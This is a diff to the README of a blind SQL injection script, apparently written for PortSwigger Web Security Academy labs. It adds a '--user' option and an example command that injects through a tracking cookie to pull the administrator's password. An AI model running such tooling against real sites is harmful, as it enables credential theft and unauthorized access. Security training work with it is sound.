@@ -24,10 +24,11 @@ optional arguments:
   --target TARGET       target cookie to inject
   --threshold THRESHOLD
                         sleep value
+  --user USER           User to get password
 ```
 example :
 ```bash
-PS C:\BSQLi> python .\bsqli.py -u https://0ab4006203554a31c012a430005400b3.web-security-academy.net/ --cookies "TrackingId=XKIVlpvhenclkwq9; session=ooCCcMKy1o34VwWinSuRNvyssm3OkZJD" --target TrackingId --threshold 7
+PS C:\BSQLi> python .\bsqli.py -u https://0ab4006203554a31c012a430005400b3.web-security-academy.net/ --cookies "TrackingId=XKIVlpvhenclkwq9; session=ooCCcMKy1o34VwWinSuRNvyssm3OkZJD" --target TrackingId --threshold 7 --user administrator
 
          ####    ###    ###   #        #
          #   #  #   #  #   #  #
